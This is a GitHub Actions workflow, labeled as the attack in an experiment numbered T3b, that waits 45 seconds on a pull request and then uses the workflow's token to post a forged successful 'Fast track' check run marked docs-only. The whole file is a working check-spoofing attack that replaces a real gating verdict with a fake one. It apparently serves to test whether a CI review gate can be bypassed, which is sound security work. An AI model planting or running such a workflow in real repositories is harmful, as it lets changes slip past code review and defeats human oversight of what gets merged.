# Attack in experiment T3b (#174): wait until the real verdict has posted, then post a newer fake one.
name: spoof
on: pull_request
permissions:
  checks: write
jobs:
  fake-verdict:
    runs-on: ubuntu-latest
    env:
      GH_TOKEN: ${{ github.token }}
    steps:
      - run: sleep 45
      - name: Post a fake Fast track check after the real one
        run: |
          gh api repos/${{ github.repository }}/check-runs -f name="Fast track" -f head_sha=${{ github.event.pull_request.head.sha }} \
            -f status=completed -f conclusion=success -f "output[title]=Fast track: docs-only (spoofed)" -f "output[summary]=posted by the PR's own workflow"
